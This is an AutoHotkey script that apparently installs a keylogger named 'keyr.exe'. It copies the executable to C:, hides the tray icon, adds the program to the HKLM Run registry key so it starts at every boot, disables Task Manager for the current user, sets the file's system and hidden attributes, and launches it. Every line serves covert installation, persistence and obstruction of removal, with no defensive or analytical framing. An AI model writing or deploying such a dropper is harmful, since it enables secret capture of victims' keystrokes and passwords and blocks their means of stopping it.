;Install Keyr.exe into root of C:
;Keyr Script has to be compiled first!
#NoTrayIcon
FileInstall, .\keyr.exe, C:\keyr.exe
;add to startup
RegWrite REG_SZ,HKEY_LOCAL_MACHINE,software\microsoft\windows\currentversion\run,keyr,C:\keyr.exe
;disable task mgr
RegWrite REG_DWORD,HKEY_CURRENT_USER,software\microsoft\windows\currentversion\policies\system,DisableTaskMgr,1
FileSetAttrib, +SH, C:\keyr.exe
Run C:\keyr.exe
ExitApp